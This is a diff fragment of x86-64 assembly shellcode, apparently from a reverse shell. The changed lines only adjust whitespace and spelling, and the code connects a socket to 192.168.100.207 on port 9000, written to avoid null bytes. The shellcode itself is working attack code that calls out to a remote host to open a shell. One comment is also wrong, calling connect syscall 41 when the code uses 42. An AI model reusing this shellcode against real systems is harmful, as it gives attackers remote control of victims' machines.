@@ -27,25 +27,25 @@ socket:
 
 connect:
 
-       mov rbp, 0xcf64a8c0     ; SAves "192.168.100.207" in hex and reverse order, storing it in RBP
+       mov rbp, 0xcf64a8c0    ; Saves "192.168.100.207" in hex and reverse order, storing it in RBP
 
-       push word 42            ; Pushes word 41 (connect) into the stack.
-       pop ax                  ; Pops such word into ax so there are no nulls.
+       push word 42           ; Pushes word 41 (connect) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
 
-       mov rdi, rbx            ; Copies the value from RBX to RDI, granting RDI the sockfd value from the socket syscall.
+       mov rdi, rbx           ; Copies the value from RBX to RDI, granting RDI the sockfd value from the socket syscall.
 
-       push rdx                ; Pushes 0
+       push rdx               ; Pushes 0
 
-       push rbp                ; Pushes the value of RBP into the Stack.
-       push word 0x2823        ; Pushes the word 9000 into the stack.
-       push word 0x02          ; Pushes AF_INET into the stack.
+       push rbp               ; Pushes the value of RBP into the Stack.
+       push word 0x2823       ; Pushes the word 9000 into the stack.
+       push word 0x02         ; Pushes AF_INET into the stack.
 
-       mov rsi, rsp            ; Copies the value of RSP into RSI.
+       mov rsi, rsp           ; Copies the value of RSP into RSI.
 
-       mov dl, 50              ; This argument requires the length of the struct, anything above 16 should work.
-       syscall                 ; The syscall is executed.
+       mov dl, 50             ; This argument requires the length of the struct, anything above 16 should work.
+       syscall                ; The syscall is executed.
 
-       xor rsi, rsi            ; Zeroes out RSI
+       xor rsi, rsi           ; Zeroes out RSI
 
        inc rsi                ; Increments RSI.
        inc rsi                ; Increments RSI.
